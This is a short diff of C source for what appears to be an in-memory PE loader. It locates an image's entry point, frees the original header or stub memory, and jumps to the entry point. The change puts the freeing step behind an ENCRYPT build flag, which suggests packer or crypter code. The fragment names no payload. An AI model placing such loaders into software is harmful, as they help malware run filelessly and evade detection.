@@ -182,9 +182,11 @@ static void ExecuteFromMemory(unsigned char* data) {
     // Entry
     void *entryPtr = (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint;
 
+#ifdef ENCRYPT
     PVOID stubBase = data;
     SIZE_T stubSize = nt->OptionalHeader.SizeOfHeaders;
     NtFreeVirtualMemory((HANDLE)-1, &stubBase, &stubSize, MEM_RELEASE);
+#endif // ENCRYPT
 
     ((void(*)(void))entryPtr)();
 }
